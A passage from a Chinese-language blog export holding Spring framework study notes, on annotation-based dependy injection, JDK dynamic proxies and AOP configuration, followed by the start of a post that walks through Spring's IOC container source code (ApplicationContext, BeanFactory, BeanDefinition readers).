value=&quot;qinjiang&quot;/&gt;&lt;/bean&gt;\n\n4、测试，报错：NoUniqueBeanDefinitionException\n5、删掉cat2，将cat的bean名称改掉！测试！因为是按类型装配，所以并不会报异常，也不影响最后的结果。甚至将id属性去掉，也不影响结果。\n这就是按照类型自动装配！\n小结这是去spring容器中寻找是否有此类型的对象存在\n有且只有一个就可以注入在这里，但是有多个Spring不知道到底赋值哪个，需要进行配置\n使用注解\n使用注解\n\njdk1.5开始支持注解，spring2.5开始全面支持注解。\n准备工作：利用注解的方式注入属性。\n1、在spring配置文件中引入context文件头\nxmlns:context=&quot;http://www.springframework.org/schema/context&quot;http://www.springframework.org/schema/contexthttp://www.springframework.org/schema/context/spring-context.xsd\n\n2、开启属性注解支持！\n&lt;context:annotation-config/&gt;\n\n\n\n@Autowired\n@Autowired是按类型自动转配的，不支持id匹配。\n需要导入 spring-aop的包！\n\n测试：\n1、将User类中的set方法去掉，使用@Autowired注解\npublic class User &#123;   @Autowired   private Cat cat;   @Autowired   private Dog dog;   private String str;   public Cat getCat() &#123;       return cat;  &#125;   public Dog getDog() &#123;       return dog;  &#125;   public String getStr() &#123;       return str;  &#125;&#125;\n\n2、此时配置文件内容\n&lt;context:annotation-config/&gt;&lt;bean id=&quot;dog&quot; class=&quot;com.kuang.pojo.Dog&quot;/&gt;&lt;bean id=&quot;cat&quot; class=&quot;com.kuang.pojo.Cat&quot;/&gt;&lt;bean id=&quot;user&quot; class=&quot;com.kuang.pojo.User&quot;/&gt;\n\n3、测试，成功输出结果！\n【小狂神科普时间】\n@Autowired(required&#x3D;false)  说明：false，对象可以为null；true，对象必须存对象，不能为null。\n//如果允许对象为null，设置required = false,默认为true@Autowired(required = false)private Cat cat;\n\n@Qualifier\n@Autowired是根据类型自动装配的，加上@Qualifier则可以根据byName的方式自动装配\n@Qualifier不能单独使用。\n\n测试实验步骤：\n1、配置文件修改内容，保证类型存在对象。且名字不为类的默认名字！\n&lt;bean id=&quot;dog1&quot; class=&quot;com.kuang.pojo.Dog&quot;/&gt;&lt;bean id=&quot;dog2&quot; class=&quot;com.kuang.pojo.Dog&quot;/&gt;&lt;bean id=&quot;cat1&quot; class=&quot;com.kuang.pojo.Cat&quot;/&gt;&lt;bean id=&quot;cat2&quot; class=&quot;com.kuang.pojo.Cat&quot;/&gt;\n\n2、没有加Qualifier测试，直接报错 因为有多个同类型的实例在容器中\n3、在属性上添加Qualifier注解\n@Autowired@Qualifier(value = &quot;cat2&quot;)private Cat cat;@Autowired@Qualifier(value = &quot;dog2&quot;)private Dog dog;\n\n测试，成功输出！\n@Resource\n@Resource如有指定的name属性，先按该属性进行byName方式查找装配；\n其次再进行默认的byName方式进行装配；\n如果以上都不成功，则按byType的方式自动装配。\n都不成功，则报异常。\n\n实体类：\npublic class User &#123;   //如果允许对象为null，设置required = false,默认为true   @Resource(name = &quot;cat2&quot;)   private Cat cat;   @Resource   private Dog dog;   private String str;&#125;\n\nbeans.xml\n&lt;bean id=&quot;dog&quot; class=&quot;com.kuang.pojo.Dog&quot;/&gt;&lt;bean id=&quot;cat1&quot; class=&quot;com.kuang.pojo.Cat&quot;/&gt;&lt;bean id=&quot;cat2&quot; class=&quot;com.kuang.pojo.Cat&quot;/&gt;&lt;bean id=&quot;user&quot; class=&quot;com.kuang.pojo.User&quot;/&gt;\n\n测试：结果OK\n配置文件2：beans.xml ， 删掉cat2\n&lt;bean id=&quot;dog&quot; class=&quot;com.kuang.pojo.Dog&quot;/&gt;&lt;bean id=&quot;cat1&quot; class=&quot;com.kuang.pojo.Cat&quot;/&gt;\n\n实体类上只保留注解\n@Resourceprivate Cat cat;@Resourceprivate Dog dog;\n\n结果：OK\n结论：先进行byName查找，失败；再进行byType查找，成功。\n小结@Autowired与@Resource异同：\n1、@Autowired与@Resource都可以用来装配bean。都可以写在字段上，或写在setter方法上。\n2、@Autowired默认按类型装配（属于spring规范），默认情况下必须要求依赖对象必须存在，如果要允许null 值，可以设置它的required属性为false，如：@Autowired(required&#x3D;false) ，如果我们想使用名称装配可以结合@Qualifier注解进行使用\n3、@Resource（属于J2EE复返），默认按照名称进行装配，名称可以通过name属性进行指定。如果没有指定name属性，当注解写在字段上时，默认取字段名进行按照名称查找，如果注解写在setter方法上默认取属性名进行装配。当找不到与名称匹配的bean时才按照类型进行装配。但是需要注意的是，如果name属性一旦指定，就只会按照名称进行装配。\n它们的作用相同都是用注解方式注入对象，但执行顺序不同。@Autowired先byType，@Resource先byName。\n使用注解开发在spring4之后，想要使用注解形式，必须得要引入aop的包\n在配置文件当中，还得要引入一个context约束\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;      xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;      xmlns:context=&quot;http://www.springframework.org/schema/context&quot;      xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd       http://www.springframework.org/schema/context       http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;&lt;/beans&gt;\n\nBean的实现我们之前都是使用 bean 的标签进行bean注入，但是实际开发中，我们一般都会使用注解！\n1、配置扫描哪些包下的注解\n&lt;!--指定注解扫描包--&gt;&lt;context:component-scan base-package=&quot;com.kuang.pojo&quot;/&gt;\n\n2、在指定包下编写类，增加注解\n@Component(&quot;user&quot;)// 相当于配置文件中 &lt;bean id=&quot;user&quot; class=&quot;当前注解的类&quot;/&gt;public class User &#123;   public String name = &quot;秦疆&quot;;&#125;\n\n3、测试\n@Testpublic void test()&#123;   ApplicationContext applicationContext =       new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);   User user = (User) applicationContext.getBean(&quot;user&quot;);   System.out.println(user.name);&#125;\n\n属性注入使用注解注入属性\n1、可以不用提供set方法，直接在直接名上添加@value(“值”)\n@Component(&quot;user&quot;)// 相当于配置文件中 &lt;bean id=&quot;user&quot; class=&quot;当前注解的类&quot;/&gt;public class User &#123;   @Value(&quot;秦疆&quot;)   // 相当于配置文件中 &lt;property name=&quot;name&quot; value=&quot;秦疆&quot;/&gt;   public String name;&#125;\n\n2、如果提供了set方法，在set方法上添加@value(“值”);\n@Component(&quot;user&quot;)public class User &#123;   public String name;   @Value(&quot;秦疆&quot;)   public void setName(String name) &#123;       this.name = name;  &#125;&#125;\n\n衍生注解我们这些注解，就是替代了在配置文件当中配置步骤而已！更加的方便快捷！\n@Component三个衍生注解为了更好的进行分层，Spring可以使用其它三个注解，功能一样，目前使用哪一个功能都一样。\n\n@Controller：web层\n@Service：service层\n@Repository：dao层\n\n写上这些注解，就相当于将这个类交给Spring管理装配了！\n作用域@scope\n\nsingleton：默认的，Spring会采用单例模式创建这个对象。关闭工厂 ，所有的对象都会销毁。\nprototype：多例模式。关闭工厂 ，所有的对象不会销毁。内部的垃圾回收机制会回收\n\n@Controller(&quot;user&quot;)@Scope(&quot;prototype&quot;)public class User &#123;   @Value(&quot;秦疆&quot;)   public String name;&#125;\n\n小结XML与注解比较\n\nXML可以适用任何场景 ，结构清晰，维护方便\n注解不是自己提供的类使用不了，开发简单方便\n\nxml与注解整合开发 ：推荐最佳实践\n\nxml管理Bean\n注解完成属性注入\n使用过程中， 可以不用扫描，扫描是为了类上的注解\n\n&lt;context:annotation-config/&gt;  \n\n作用：\n\n进行注解驱动注册，从而使注解生效\n用于激活那些已经在spring容器里注册过的bean上面的注解，也就是显示的向Spring注册\n如果不扫描包，就需要手动配置bean\n如果不加注解驱动，则注入的值为null！\n\n代理模式代理模式：\n\n静态代理\n动态代理\n\n\n在这个过程中，你直接接触的就是中介，就如同现实生活中的样子，你看不到房东，但是你依旧租到了房东的房子通过代理，这就是所谓的代理模式，程序源自于生活，所以学编程的人，一般能够更加抽象的看待生活中发生的事情。\n静态代理的好处:\n\n可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情 .\n公共的业务由代理来完成 . 实现了业务的分工 ,\n公共业务发生扩展时变得更加集中和方便 .\n\n缺点 :\n\n类多了 , 多了代理类 , 工作量变大了 . 开发效率降低 .\n\n我们想要静态代理的好处，又不想要静态代理的缺点，所以 , 就有了动态代理 !\n动态代理\n动态代理的角色和静态代理的一样 .\n\n动态代理的代理类是动态生成的 . 静态代理的代理类是我们提前写好的\n\n动态代理分为两类 : 一类是基于接口动态代理 , 一类是基于类的动态代理\n\n\n基于接口的动态代理—-JDK动态代理\n基于类的动态代理–cglib\n现在用的比较多的是 javasist 来生成动态代理 . 百度一下javasist\n我们这里使用JDK的原生代码来实现，其余的道理都是一样的！、\n\n\n\nJDK的动态代理需要了解两个类\n核心 : InvocationHandler   和   Proxy \n代码实现 \n抽象角色和真实角色和之前的一样！\nRent . java 即抽象角色\n//抽象角色：租房public interface Rent &#123;   public void rent();&#125;\n\nHost . java 即真实角色\n//真实角色: 房东，房东要出租房子public class Host implements Rent&#123;   public void rent() &#123;       System.out.println(&quot;房屋出租&quot;);  &#125;&#125;\n\nProxyInvocationHandler. java 即代理角色\npublic class ProxyInvocationHandler implements InvocationHandler &#123;   private Rent rent;   public void setRent(Rent rent) &#123;       this.rent = rent;  &#125;   //生成代理类，重点是第二个参数，获取要代理的抽象角色！之前都是一个角色，现在可以代理一类角色   public Object getProxy()&#123;       return Proxy.newProxyInstance(this.getClass().getClassLoader(),               rent.getClass().getInterfaces(),this);  &#125;   // proxy : 代理类 method : 代理类的调用处理程序的方法对象.   // 处理代理实例上的方法调用并返回结果   @Override   public Object invoke(Object proxy, Method method, Object[] args) throwsThrowable &#123;       seeHouse();       //核心：本质利用反射实现！       Object result = method.invoke(rent, args);       fare();       return result;  &#125;   //看房   public void seeHouse()&#123;       System.out.println(&quot;带房客看房&quot;);  &#125;   //收中介费   public void fare()&#123;       System.out.println(&quot;收中介费&quot;);  &#125;&#125;\n\nClient . java\n//租客public class Client &#123;   public static void main(String[] args) &#123;       //真实角色       Host host = new Host();       //代理实例的调用处理程序       ProxyInvocationHandler pih = new ProxyInvocationHandler();       pih.setRent(host); //将真实角色放置进去！!!!!!!!!!!!!!       Rent proxy = (Rent)pih.getProxy(); //动态生成对应的代理类！       proxy.rent();  &#125;&#125;\n\n注意在测试代码中，是把真实角色交给代理类，生成对应的代理类实例\n核心：一个动态代理 , 一般代理某一类业务 , 一个动态代理可以代理多个类，代理的是接口！、\nAOPAOP（Aspect Oriented Programming）意为：面向切面编程，通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。\nAOP是OOP的延续，是软件开发中的一个热点，也是Spring框架中的一个重要内容，是函数式编程的一种衍生范型。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。\nAop在Spring中的作用提供声明式事务；允许用户自定义切面\n以下名词需要了解下：\n\n横切关注点：跨越应用程序多个模块的方法或功能。即是，与我们业务逻辑无关的，但是我们需要关注的部分，就是横切关注点。如日志 , 安全 , 缓存 , 事务等等 ….\n切面（ASPECT）：横切关注点 被模块化 的特殊对象。即，它是一个类。\n通知（Advice）：切面必须要完成的工作。即，它是类中的一个方法。\n目标（Target）：被通知对象。\n代理（Proxy）：向目标对象应用通知之后创建的对象。\n切入点（PointCut）：切面通知 执行的 “地点”的定义。\n连接点（JointPoint）：与切入点匹配的执行点。\n\n\nSpringAOP中，通过Advice定义横切逻辑，Spring中支持5种类型的Advice\n可以通过这些使得在不改变原有代码的情况下增加新的功能\n使用Spring实现Aop【重点】使用AOP织入，需要导入一个依赖包！\n&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;&lt;dependency&gt;   &lt;groupId&gt;org.aspectj&lt;/groupId&gt;   &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt;   &lt;version&gt;1.9.4&lt;/version&gt;&lt;/dependency&gt;\n\n第一种方式通过 Spring API 实现\n首先编写我们的业务接口和实现类\npublic interface UserService &#123;   public void add();   public void delete();   public void update();   public void search();&#125;public class UserServiceImpl implements UserService&#123;   @Override   public void add() &#123;       System.out.println(&quot;增加用户&quot;);  &#125;   @Override   public void delete() &#123;       System.out.println(&quot;删除用户&quot;);  &#125;   @Override   public void update() &#123;       System.out.println(&quot;更新用户&quot;);  &#125;   @Override   public void search() &#123;       System.out.println(&quot;查询用户&quot;);  &#125;&#125;\n\n然后去写我们的增强类 , 我们编写两个 , 一个前置增强 一个后置增强\npublic class Log implements MethodBeforeAdvice &#123;   //method : 要执行的目标对象的方法   //objects : 被调用的方法的参数   //Object : 目标对象   @Override   public void before(Method method, Object[] objects, Object o) throws Throwable &#123;       System.out.println( o.getClass().getName() + &quot;的&quot; + method.getName() + &quot;方法被执行了&quot;);  &#125;&#125;public class AfterLog implements AfterReturningAdvice &#123;   //returnValue 返回值   //method被调用的方法   //args 被调用的方法的对象的参数   //target 被调用的目标对象   @Override   public void afterReturning(Object returnValue, Method method, Object[] args,Object target) throws Throwable &#123;       System.out.println(&quot;执行了&quot; + target.getClass().getName()       +&quot;的&quot;+method.getName()+&quot;方法,&quot;       +&quot;返回值：&quot;+returnValue);  &#125;&#125;\n\n最后去spring的文件中注册 , 并实现aop切入实现 , 注意导入约束 .\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;      xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;      xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;      xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd       http://www.springframework.org/schema/aop       http://www.springframework.org/schema/aop/spring-aop.xsd&quot;&gt;   &lt;!--注册bean--&gt;   &lt;bean id=&quot;userService&quot; class=&quot;com.kuang.service.UserServiceImpl&quot;/&gt;   &lt;bean id=&quot;log&quot; class=&quot;com.kuang.log.Log&quot;/&gt;   &lt;bean id=&quot;afterLog&quot; class=&quot;com.kuang.log.AfterLog&quot;/&gt;   &lt;!--aop的配置--&gt;   &lt;aop:config&gt;       &lt;!--切入点 expression:表达式匹配要执行的方法--&gt;       &lt;aop:pointcut id=&quot;pointcut&quot; expression=&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;/&gt;       &lt;!--执行环绕; advice-ref执行方法 . pointcut-ref切入点--&gt;       &lt;aop:advisor advice-ref=&quot;log&quot; pointcut-ref=&quot;pointcut&quot;/&gt;       &lt;aop:advisor advice-ref=&quot;afterLog&quot; pointcut-ref=&quot;pointcut&quot;/&gt;   &lt;/aop:config&gt;&lt;/beans&gt;\n\n测试\npublic class MyTest &#123;   @Test   public void test()&#123;       ApplicationContext context = newClassPathXmlApplicationContext(&quot;beans.xml&quot;);       UserService userService = (UserService) context.getBean(&quot;userService&quot;);       userService.search();  &#125;&#125;\n\nAop的重要性 : 很重要 . 一定要理解其中的思路 , 主要是思想的理解这一块 .\nSpring的Aop就是将公共的业务 (日志 , 安全等) 和领域业务结合起来 , 当执行领域业务时 , 将会把公共业务加进来 . 实现公共业务的重复利用 . 领域业务更纯粹 , 程序猿专注领域业务 , 其本质还是动态代理 . \nTIP第一种方式是在原有的基础上创建了新类，继承了对应的接口，然后重写了对应的方法\n之后在配置中确定什么时候切入执行\n第二种方式自定义类来实现Aop\n目标业务类不变依旧是userServiceImpl\n第一步 : 写我们自己的一个切入类\npublic class DiyPointcut &#123;   public void before()&#123;       System.out.println(&quot;---------方法执行前---------&quot;);  &#125;   public void after()&#123;       System.out.println(&quot;---------方法执行后---------&quot;);  &#125;   &#125;\n\n去spring中配置\n&lt;!--第二种方式自定义实现--&gt;&lt;!--注册bean--&gt;&lt;bean id=&quot;diy&quot; class=&quot;com.kuang.config.DiyPointcut&quot;/&gt;&lt;!--aop的配置--&gt;&lt;aop:config&gt;   &lt;!--第二种方式：使用AOP的标签实现--&gt;   &lt;aop:aspect ref=&quot;diy&quot;&gt;       &lt;aop:pointcut id=&quot;diyPonitcut&quot; expression=&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;/&gt;       &lt;aop:before pointcut-ref=&quot;diyPonitcut&quot; method=&quot;before&quot;/&gt;       &lt;aop:after pointcut-ref=&quot;diyPonitcut&quot; method=&quot;after&quot;/&gt;   &lt;/aop:aspect&gt;&lt;/aop:config&gt;\n\n测试：\npublic class MyTest &#123;   @Test   public void test()&#123;       ApplicationContext context = newClassPathXmlApplicationContext(&quot;beans.xml&quot;);       UserService userService = (UserService) context.getBean(&quot;userService&quot;);       userService.add();  &#125;&#125;\n\nTIP第二种方式和第一种方式的本质区别是在于不用继承某些接口，靠配置进行确定在什么时候执行函数\n第三种方式使用注解实现\n第一步：编写一个注解实现的增强类\npackage com.kuang.config;import org.aspectj.lang.ProceedingJoinPoint;import org.aspectj.lang.annotation.After;import org.aspectj.lang.annotation.Around;import org.aspectj.lang.annotation.Aspect;import org.aspectj.lang.annotation.Before;@Aspectpublic class AnnotationPointcut &#123;   @Before(&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;)   public void before()&#123;       System.out.println(&quot;---------方法执行前---------&quot;);  &#125;   @After(&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;)   public void after()&#123;       System.out.println(&quot;---------方法执行后---------&quot;);  &#125;   @Around(&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;)   public void around(ProceedingJoinPoint jp) throws Throwable &#123;       System.out.println(&quot;环绕前&quot;);       System.out.println(&quot;签名:&quot;+jp.getSignature());       //执行目标方法proceed       Object proceed = jp.proceed();       System.out.println(&quot;环绕后&quot;);       System.out.println(proceed);  &#125;&#125;\n\n第二步：在Spring配置文件中，注册bean，并增加支持注解的配置\n&lt;!--第三种方式:注解实现--&gt;&lt;bean id=&quot;annotationPointcut&quot; class=&quot;com.kuang.config.AnnotationPointcut&quot;/&gt;&lt;aop:aspectj-autoproxy/&gt;\n\naop:aspectj-autoproxy：说明\n通过aop命名空间的&lt;aop:aspectj-autoproxy /&gt;声明自动为spring容器中那些配置@aspectJ切面的bean创建代理，织入切面。当然，spring 在内部依旧采用AnnotationAwareAspectJAutoProxyCreator进行自动代理的创建工作，但具体实现的细节已经被&lt;aop:aspectj-autoproxy /&gt;隐藏起来了&lt;aop:aspectj-autoproxy /&gt;有一个proxy-target-class属性，默认为false，表示使用jdk动态代理织入增强，当配为&lt;aop:aspectj-autoproxy  poxy-target-class=&quot;true&quot;/&gt;时，表示使用CGLib动态代理技术织入增强。不过即使proxy-target-class设置为false，如果目标类没有声明接口，则spring将自动使用CGLib动态代理。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n我们在不改变原来的代码的情况下，实现了对原有功能的增强，这是AOP中最核心的思想\n聊聊AOP：纵向开发，横向开发\n","tags":["2021"]},{"title":"Spring 究极解析","url":"/2021/05/07/2021/Spring-%E7%A9%B6%E6%9E%81%E8%A7%A3%E6%9E%90/","content":"\n\nSpring体系架构\n\nCore Container（核心容器）\n\n该模块主要包含Core、Beans、Context和SpEL模块。其中Core和Beans是整个框架最基础的部分，提供**控制反转(IOC)和依赖注入(DI)**特性。这里最重要的概念就是BeanFactory，提供了以Factory模式的实现来消除对程序性单例模式。\n\nCore：模块主要包含Spring框架最基本的核心工具类，Core是其他组件的基础核心。\nBeans：模块主要包含访问配置文件、创建&#x2F;管理Bean以及IOC&#x2F;DI相关的类。\nContext：继承了Beans的特性，主要为Spring提供大量的扩展，如国际化、事件机制、资源加载等待。ApplicationContext接口是Context模块的关键。\nSpEL：模块提供了一个强大的语言表达式。\n\n\n回顾一下IOC和DI：\n\nIOC：反转控制，对象的控制权交给Spring的IOC容器管理，而不用我们通过new来创建，从而解耦。\nDI：依赖注入，相对于反转控制更加具体的概念，某个对象需要依赖其它对象时，Spring会通过注入的方式将其所依赖的对象交给它使用。\n\n\n\nAOP and Instrumentation\n\n提供符合AOP Alliance标准的面向切面编程的实现，可以让你定义如方法拦截器和切点，从而降低程序之间的耦合性。 AspectJ模块提供了与AspectJ的集成。 而Instrumentation模块提供用于某些应用程序服务器的类工具支持和类加载器实现 。\n\nMessaging\n\n该模块具有来自Spring Integration项目的关键抽象，如Message、MessageChannel、MessageHandler等。它们构成基于消息的应用程序的基础。该模块还包括一组注释，用于将消息映射到方法，类似于基于Spring MVC注释的编程模型。\n\nData Access&#x2F;Integration\n\n数据访问&#x2F;集成层由JDBC，ORM，OXM，JMS和事务模块组成。\n\nJDBC模块：提供了JDBC抽象层，从而无需进行繁琐的JDBC编码和数据库特定错误代码（不同数据代码可能不同）的解析。\n事务模块：支持对实现特殊接口的类以及所有POJO（普通Java对象）进行编程和声明式事务管理。\nORM模块：该模块为当前流行的ORM（包括JPA，JDO和Hibernate）提供了集成层。使用ORM模块，可以将所有这些O&#x2F;R映射框架与Spring提供的所有功能结合使用，如前面提到的事务管理功能。\nOXM模块：提供了一个抽象层，该抽象层支持Object&#x2F; XML映射实现，例如JAXB，Castor，XMLBeans，JiBX和XStream。JMS模块（Java Messaging Service）：包含用于生成和使用消息的功能。从Spring Framework 4.1开始，提供了与Spring­Messaging模块集成。\n\n\nWeb\n\nWeb上下文模块建立在应用程序上下文模块之上，为基于Web的应用程序提供上下文支持。该模块包含Web、WebMVC、Web Socket和Web­Porlet模块。\n\nWeb模块：提供了基本的面向Web的集成功能，如文件上传功能以及使用Servlet监听器和面向Web的应用程序上下文对IoC容器的初始化。\nWebMVC模块（也称为Web­Servlet模块）：包含基于Spring的Model­View­Controller（MVC）支持和针对Web应用程序的Rest Web服务实现。\nWeb­Portlet 模块（也称为Web­Portlet模块）：提供Portlet环境中的MVC实现。\n\n\nTest\n\n该模块支持使用JUnit或TestNG对Spring组件进行单元测试和集成测试。\n\nSpring最重要的概念是IOC 和 AOP，而其中IOC又是Spring中的根基。如果把Spring比作一棵树，那么IOC就是树根。\nSpringIOC源码整体流程本节我们会对SpringIOC整体流程的源码进行总体分析，主要介绍整体流程，很多细节的地方后续会单独做详细介绍。\n前言在使用Spring时，你一定见过这几个段代码：\n// 通过基于注解的ApplicationContext获取BeanAnnotationConfigApplicationContext applicationContext     = new AnnotationConfigApplicationContext(MainConfig.class);User user1 = applicationContext.getBean(&quot;user&quot;, User.class);// 通过基于xml的ApplicationContext获取BeanClassPathXmlApplicationContext xmlApplicationContext     = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);User user2 = xmlApplicationContext.getBean(&quot;user&quot;, User.class);// 通过BeanFactory获取BeanDefaultListableBeanFactory beanFactory     = new DefaultListableBeanFactory();User user3 = beanFactory.getBean(&quot;user&quot;, User.class);\n\n通过ApplicationContext或者BeanFactory，我们可以传入Bean的名称，从而获取Spring容器中的指定对象。\n那ApplicationContext和BeanFactory是什么？有什么用？两者有何异同？\n我们先来看下面一张图：\n\n可以看到，BeanFactory是用于访问Spring核心容器的根接口，它采用了典型的简单工厂模式，是用于生产Bean的一个Bean工厂，其提供了生产Bean所需的最基本规则。\n而ApplicationContext则是BeanFactory的一个子类，它是核心容器中Context的核心，继承了Beans的特性，为Spring提供了大量扩展。\n主要是对BeanFactory进行了扩展处理！\nIOC的大致流程Spring中整个IOC的大致流程如下：\n\n大致流程可以描述为：\nApplicationContext通过读取，扫描，注册得到BeanDefinition_Map，再交付给BeanFactory，委托其生产Bean，最终得到Bean单例池【其实也是个Map&lt;name,Bean&gt;。\nBeanDefinitionBeanDefinition是Bean在Spring中的描述，有了BeanDefinition我们就可以创建Bean。\n\n\n关于在Idea中如何做出上图：\n首先点击某个接口右键得到拓扑图\n在拓扑图中点击接口 Ctrl + Alt + B\n再 Ctrl + A 全选，Enter导入\n\nBeanDefinition接口是顶级基础接口，用来描述Bean，里面存放Bean元数据。\n比如Bean类名、scope、属性、构造函数参数列表、依赖的bean、是否是单例类、是否是懒加载等一些列信息。BeanDefinition的操作如下：\n\nBeanDefinitionRegistry接口：有增、查、删BeanDefinition的能力，一次只能注册一个BeanDefinition。\n实现类有SimpleBeanDefinitionRegistry、DefaultListableBeanFactory、GenericApplicationContext等。\n一般实现类里都都有一个用来存储BeanDefinition的Map结构。\n\nBeanDefinitionReader接口： 既可以使用BeanDefinitionRegistry构造，也可以通过loadBeanDefinitions 把配置加载为多个BeanDefinition并注册到BeanDefinitionRegistry中。 \n可以说是高效版本的BeanDefinitionRegistry。实现类有 XmlBeanDefinitionReader用于从xml中读取BeanDefinition，和PropertiesBeanDefinitionReader从Properties文件读取BeanDefinition。\n\nAnnotatedBeanDefinitionReader类：对带有注解的BeanDefinition进行注册。\n\nClassPathBeanDefinitionScanner类：可以扫描到@Component、@Repository、@Service、@Controller注解的BeanDefinition注册到容器中。\n\n\nApplicationContext和BeanFactory看了IOC的大致流程，我们可以简单总结一下ApplicationContext和BeanFactory的异同点。ApplicationContext继承自BeanFactory，它们俩的关系相当于销售商和工厂的关系：\n\n\n\nFeature\nBeanFactory\nApplicationContext\n\n\n\nBean实例化&#x2F;装配\nYes\nYes\n\n\n集成的生命周期管理\nNo\nYes\n\n\n自动注册 BeanPostProcessor 后置处理器\nNo\nYes\n\n\n自动注册 BeanFactoryPostProcessor 后置处理器\nNo\nYes\n\n\n便利的 MessageSource 访问 (国际化)\nNo\nYes\n\n\n内置 ApplicationEvent 事件发布机制\nNo\nYes\n\n\n可以看到，BeanFactory唯一的职责就是生产Bean。而ApplicationContext提供了大量的扩展点，相对于BeanFactory来说功能更为强大。\n源码分析ApplicationContext的初始化我们以AnnotationConfigApplicationContext(注解方式)为例来讲解IOC的流程(基于xml的流程会略有不同)：\npublic static void main(String[] args)   &#123;   // 加载spring上下文   AnnotationConfigApplicationContext context =         new AnnotationConfigApplicationContext(MainConfig.class);&#125;\n\n我们点进去看：\npublic AnnotationConfigApplicationContext(Class&lt;?&gt;... annotatedClasses) &#123;\t//调用构造函数\tthis();\t//注册我们的配置类\tregister(annotatedClasses);\t//IOC容器刷新接口\trefresh();&#125;\n\n注意到会先调用其父类的构造方法：\npublic GenericApplicationContext() &#123;\t/**\t * 调用父类的构造函数,为ApplicationContext spring上下文对象初始beanFactory\t * 为啥是DefaultListableBeanFactory？我们去看BeanFactory接口的时候\t * 发DefaultListableBeanFactory是最底层的实现，功能是最全的\t */\tthis.beanFactory = new DefaultListableBeanFactory();&#125;\n\n我们原先知晓DefaultListableBeanFactory是最底层的类，实现了BeanFactory。\n那么我们接着走下面的方法\npublic AnnotationConfigApplicationContext() &#123;\t/**\t * 创建一个读取注解的Bean定义读取器\t * 什么是bean定义？BeanDefinition\t * 完成了spring内部BeanDefinition的注册（主要是后置处理器）\t */\tthis.reader = new AnnotatedBeanDefinitionReader(this);\t/**\t * 创建BeanDefinition扫描器\t * 可以用来扫描包或者类，继而转换为bd\t *\t * spring默认的扫描包不是这个scanner对象\t * 而是自己new的一个ClassPathBeanDefinitionScanner\t * spring在执行工程后置处理器ConfigurationClassPostProcessor时，去扫描包时会new一个ClassPathBeanDefinitionScanner\t *\t * 这里的scanner仅仅是为了程序员可以手动调用AnnotationConfigApplicationContext对象的scan方法\t */\tthis.scanner = new ClassPathBeanDefinitionScanner(this);&#125;\n\nOK这里我们再次分析\nBeanDefinitionReader初始化首先进入他的初始化中：\n// 可以看到registry其实就是AnnotationConfigApplicationContext实例public AnnotatedBeanDefinitionReader(BeanDefinitionRegistry registry) &#123;\tthis(registry, getOrCreateEnvironment(registry));&#125;public AnnotatedBeanDefinitionReader(BeanDefinitionRegistry registry, Environment environment) &#123;\tAssert.notNull(registry, &quot;BeanDefinitionRegistry must not be null&quot;);\tAssert.notNull(environment, &quot;Environment must not be null&quot;);\t//把ApplicationContext对象赋值给AnnotatedBeanDefinitionReader       //这里是MainConfig.class\tthis.registry = registry;\t//用户处理条件注解 @Conditional os.name\tthis.conditionEvaluator = new ConditionEvaluator(registry, environment, null);\t//注册一些内置的后置处理器\tAnnotationConfigUtils.registerAnnotationConfigProcessors(this.registry);&#125;\n\n可以看到Reader的初始化过程中，注册了Spring内置的后置处理器。\n这个步骤非常关键，为后续解析Bean奠定了基础，这些内置的后置处理器是Spring中创世纪的类，因为其它所有Bean的实例化都离不开它们。下面我们就根据到AnnotationConfigUtils类中：\npublic static void registerAnnotationConfigProcessors(BeanDefinitionRegistry registry) &#123;\tregisterAnnotationConfigProcessors(registry, null);&#125;//注册了一堆的后置处理器public static Set&lt;BeanDefinitionHolder&gt; registerAnnotationConfigProcessors(\t\tBeanDefinitionRegistry registry, @Nullable Object source) &#123;\t......Set&lt;BeanDefinitionHolder&gt; beanDefs = new LinkedHashSet&lt;&gt;(8);      /** 主要有以下几个后置处理器:        * 1. 后置处理器ConfigurationClassPostProcessor负责处理配置类        * 2. 后置处理器AutowiredAnnotationBeanPostProcessor用于解析@Autowired注解        * 3. 后置处理器CommonAnnotationBeanPostProcessor它负责解析        *    @Resource、@WebServiceRef、@EJB三个注解。        * 4. EventListenerMethodProcessor负责处理@EvenListener注解        */            // 我们选择一个举例：      // 判断是否已经存在ConfigurationClassPostProcessor的Bean定义了if (!registry.          containsBeanDefinition(CONFIGURATION_ANNOTATION_PROCESSOR_BEAN_NAME)) &#123;\t// 创建该类的BeanDefinition\tRootBeanDefinition def               = new RootBeanDefinition(ConfigurationClassPostProcessor.class);\tdef.setSource(source);          // 执行registerPostProcessor方法注册Bean\tbeanDefs.add(registerPostProcessor(registry, def,                         CONFIGURATION_ANNOTATION_PROCESSOR_BEAN_NAME));&#125;      // 省略后续的后置处理器的注册过程return beanDefs;&#125;//注册Bean的方法private static BeanDefinitionHolder registerPostProcessor(\t\tBeanDefinitionRegistry registry, RootBeanDefinition definition, String beanName) &#123;\t//方法开始       // 